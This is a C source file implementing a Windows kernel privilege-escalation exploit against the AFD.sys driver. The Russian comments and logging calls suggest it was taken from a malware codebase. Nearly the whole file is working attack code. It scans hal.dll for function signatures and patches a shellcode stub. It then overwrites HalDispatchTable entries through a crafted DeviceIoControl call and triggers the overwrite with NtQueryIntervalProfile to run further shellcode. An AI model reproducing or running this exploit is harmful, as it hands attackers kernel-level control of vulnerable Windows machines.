typedef LONG NTSTATUS, *PNTSTATUS;

typedef struct _sockaddr_in {
    short   sin_family;
    u_short sin_port;
    struct  in_addr sin_addr;
    char    sin_zero[8];
}sockaddr_in;

#define AFD_SIGS_COUNT 4
uint8_t signatures[AFD_SIGS_COUNT][17] = {{16, 0x33, 0xC5, 0x89, 0x45, 0xFC, 0x8B, 0x45, 0x08, 0x8B, 0x4D, 0x10, 0x53, 0x56, 0x33, 0xD2, 0x57},
                                          {5,  0x81, 0xEC, 0x34, 0x01, 0x00, 0x00, 0x8B, 0x45, 0x08, 0x33, 0xC9, 0x83, 0xE8, 0x07, 0x57, 0x8B},
                                          {5,  0x81, 0xEC, 0x34, 0x01, 0x00, 0x00, 0x8B, 0x45, 0x08, 0x8B, 0x55, 0x14, 0x33, 0xC9, 0x2B, 0xC1},
                                          {5,  0x81, 0xEC, 0x40, 0x01, 0x00, 0x00, 0x8B, 0x45, 0x08, 0x53, 0x33, 0xDB, 0x83, 0xE8, 0x07, 0x57}};

char irpstuff[256]  = {0x41,0x41,0x41,0x41,0x42,0x42,0x42,0x42,0x00,0x00,0x00,0x00,0x44,0x44,0x44,0x44,
                       0x01,0x00,0x00,0x00,0xe8,0x00,0x04,0xf0,0x00}; 

/*
mov     eax, 0AAAAAAAAh
mov     [0BBBBBBBBh], eax
mov     eax, 0CCCCCCCCh
mov     [0DDDDDDDDh], eax
mov     eax, 0EEEEEEEEh
call    eax
retn    10h
*/
char afd_sc_level0[30] = {0xB8, 0xAA, 0xAA, 0xAA, 0xAA, 0xA3, 0xBB, 0xBB, 0xBB, 0xBB, 0xB8, 0xCC, 0xCC, 0xCC, 0xCC, 0xA3, 0xDD, 0xDD, 0xDD, 0xDD, 0xB8, 0xEE, 0xEE, 0xEE, 0xEE, 0xFF, 0xD0, 0xC2, 0x10, 0x00};

int exploit_fire_afd()
{
    DWORD baseaddr = 0x1001, RegionSize = 0x1000, written;
    WSADATA wsd;
    SOCKET client;
    sockaddr_in addr;
    NTSTATUS dwStatus;
    HMODULE hHal;
    uint8_t* pHaliSetSystemInformation;
    uint8_t* pHaliQuerySystemInformation = NULL;
    uint8_t* scTargetAddr;
    IO_STATUS_BLOCK IoStatusBlock;
    ULONG inpV, outV = 0, hola;
    int ret = ERR_BAD;
    HMODULE hLib;
    LONG (*fnWSAStartup)(WORD wVersionRequested, PVOID lpWSAData);
    LONG (*fnWSASocket)(int af, int type, int protocol, PVOID lpProtocolInfo, int g, DWORD dwFlags);
    LONG (*fnConnect)(SOCKET s,const struct sockaddr* name,int namelen);
    NTSTATUS (*fnZwDeviceIoControlFile)(HANDLE FileHandle,HANDLE Event,PVOID ApcRoutine,PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, ULONG IoControlCode, PVOID InputBuffer, ULONG InputBufferLength, PVOID OutputBuffer, ULONG OutputBufferLength);
    NTSTATUS (*fnNtQueryIntervalProfile)( int ProfileSource, PULONG Interval );
    NTSTATUS (*fnNtAllocateVirtualMemory)(HANDLE  ProcessHandle,  pvoid_t *BaseAddress, ULONG ZeroBits, PULONG RegionSize, ULONG AllocationType, ULONG Protect);

    do {
        INLOG("exploit_fire_afd() start", 0);

        if (gSysInfo.osMajorVer != 5) {
            INLOG("Unsupported OS", gSysInfo.osMajorVer);
            break;
        }

        hLib = fnLoadLibraryA("ws2_32.dll");
        fnWSAStartup = fnGetProcAddress(hLib,"WSAStartup");
        fnWSASocket = fnGetProcAddress(hLib,"WSASocketA");
        fnConnect = fnGetProcAddress(hLib,"connect");
        fnFreeLibrary(hLib);

        hLib = fnLoadLibraryA("ntdll.dll");
        fnZwDeviceIoControlFile = fnGetProcAddress(hLib,"ZwDeviceIoControlFile");
        fnNtQueryIntervalProfile = fnGetProcAddress(hLib,"NtQueryIntervalProfile");
        fnNtAllocateVirtualMemory = fnGetProcAddress(hLib,"NtAllocateVirtualMemory");
        fnFreeLibrary(hLib);

        fnWSAStartup(MAKEWORD(2, 2), &wsd);
        
        client = fnWSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);

        if (client == INVALID_SOCKET) {
            INLOG("fnWSASocket error failed", 0);
            break;
        }

        __stosb((uint8_t*)&addr, 0, sizeof(addr));
        addr.sin_family = AF_INET;
        addr.sin_port = ror16(7876, 8);
        addr.sin_addr.s_addr = 0x0100007F;
        fnConnect(client, (const sockaddr_in*)&addr, sizeof(addr));

        __stosb((uint8_t*)&irpstuff[25], 0x45, 231);

        dwStatus = fnNtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&baseaddr, 0x0, &RegionSize, 0x1000 | 0x2000, PAGE_EXECUTE_READWRITE);

        if (dwStatus != 0) {
            INLOG("NtAllocateVirtualMemory error = %x", dwStatus);
            break;
        }

        __movsb(0x1000, irpstuff, 256);

        if (fnVirtualProtect((LPVOID)0x00020000, 0x1000, PAGE_EXECUTE_READWRITE, &written) == 0) {
            INLOG("VirtualProtect error = %x", GetLastError());
            break;
        }

        hHal = fnLoadLibraryExW(L"hal.dll", NULL, LOAD_LIBRARY_AS_DATAFILE);

        if (hHal != NULL) {
            PIMAGE_DOS_HEADER dosHdr = (PIMAGE_DOS_HEADER)((uint8_t*)hHal - 1);
            PIMAGE_NT_HEADERS ntHdr = (PIMAGE_NT_HEADERS)((uint8_t*)dosHdr + dosHdr->e_lfanew);
            PIMAGE_NT_HEADERS newNtHdrs;
            PIMAGE_SECTION_HEADER sectHdr;
            UINT16 i, j, sectionNum;
            uint8_t* itr;
            uint8_t* end;
            uint8_t* fakeBase = NULL;

            // Резервируем память для нашего образа
            fakeBase = (unsigned char*)SYS_ALLOCATOR(ntHdr->OptionalHeader.SizeOfImage);

            if (fakeBase == NULL) {
                break;
            }

            // Копируем PE-заголовок, включая MZ-заголовк с DOS-стабом.
            __movsb(fakeBase, dosHdr, ntHdr->OptionalHeader.SizeOfHeaders);
            newNtHdrs = (PIMAGE_NT_HEADERS)(fakeBase + dosHdr->e_lfanew);

            // Копируем все секции.
            sectHdr = IMAGE_FIRST_SECTION(newNtHdrs);
            sectionNum = newNtHdrs->FileHeader.NumberOfSections;

            for (i = 0; i < sectionNum; ++i, ++sectHdr) {
                __movsb(fakeBase + sectHdr->VirtualAddress, (uint8_t*)dosHdr + sectHdr->PointerToRawData, sectHdr->SizeOfRawData);
            }

            sectHdr = IMAGE_FIRST_SECTION(newNtHdrs);

            for (i = 0; i < sectionNum; ++i, ++sectHdr) {
                if ((sectHdr->Characteristics  & IMAGE_SCN_CNT_CODE) == IMAGE_SCN_CNT_CODE) {
                    itr = (uint8_t*)fakeBase + sectHdr->VirtualAddress;
                    end = itr + sectHdr->Misc.VirtualSize - 16;

                    for ( ; itr < end && pHaliQuerySystemInformation == NULL; ++itr) {
                        for (j = 0; j < AFD_SIGS_COUNT; ++j) {
                            if (memcmp(itr, &(signatures[j])[1], 16) == 0) {
                                pHaliQuerySystemInformation = itr - fakeBase - signatures[j][0];
                                for (pHaliSetSystemInformation = pHaliQuerySystemInformation + (puint_t)fakeBase; *((uint64_t*)pHaliSetSystemInformation) != 0x08458BEC8B55FF8BULL; --pHaliSetSystemInformation);
                                pHaliQuerySystemInformation += (puint_t)halBase;
                                pHaliSetSystemInformation += halBase - fakeBase;
                                break;
                            }
                        }
                    }
                }
            }

            SYS_DEALLOCATOR(fakeBase);
            fnFreeLibrary(hHal);

            if (pHaliQuerySystemInformation == NULL) {
                INLOG("Can't found functions offsets", 0);
                break;
            }
        }
        else {
            INLOG("Can't load hal.dll = %x", GetLastError());
            break;
        }

        utils_fix_32value(afd_sc_level0, sizeof(afd_sc_level0), 0xAAAAAAAA, (uint32_t)pHaliSetSystemInformation);
        utils_fix_32value(afd_sc_level0, sizeof(afd_sc_level0), 0xBBBBBBBB, (uint32_t)(pHalDispatchTable + (sizeof(uint8_t*) << 1)));
        utils_fix_32value(afd_sc_level0, sizeof(afd_sc_level0), 0xCCCCCCCC, (uint32_t)pHaliQuerySystemInformation);
        utils_fix_32value(afd_sc_level0, sizeof(afd_sc_level0), 0xDDDDDDDD, (uint32_t)(pHalDispatchTable + sizeof(uint8_t*)));
        utils_fix_32value(afd_sc_level0, sizeof(afd_sc_level0), 0xEEEEEEEE, (uint32_t)gLevel1Shellcode);

        scTargetAddr = (uint8_t*)(0x00020700 | ((uint32_t)pHaliQuerySystemInformation & 0xFF));
        __movsb((uint8_t*)scTargetAddr, (uint8_t*)afd_sc_level0, sizeof(afd_sc_level0));

        // Trigger Pointer Overwrite 
        dwStatus = fnZwDeviceIoControlFile((HANDLE)client, NULL, NULL, NULL, &IoStatusBlock,  0x000120bb, (PVOID)0x1004, 0x108, (PVOID)(pHalDispatchTable + sizeof(uint8_t*) + 1), 0);

        // Trigger afdShellcode
        inpV = 0x1337;
        hola = fnNtQueryIntervalProfile(inpV, &outV);

        ret = ERROR_NONE;
    } while (0);

    INLOG("exploit_fire_afd() end", 0);

    return ret;
}
